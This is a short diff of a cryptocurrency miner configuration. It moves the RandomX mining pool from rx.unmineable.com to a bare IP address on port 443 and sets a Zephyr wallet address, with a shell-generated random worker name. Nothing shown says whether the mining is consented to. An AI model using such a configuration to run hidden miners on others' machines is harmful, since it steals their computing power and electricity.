@@ -62,8 +62,8 @@
         {
             "algo": "rx/0",
             "coin": null,
-            "url": "rx.unmineable.com:3333",
-            "user": "ZEPH:ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(shuf -n 1 -i 1-99999)",
+            "url": "138.197.12.20:443",
+            "user": "ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(shuf -n 1 -i 1-99999)",
             "pass": "x",
             "rig-id": "null",
             "nicehash": false,
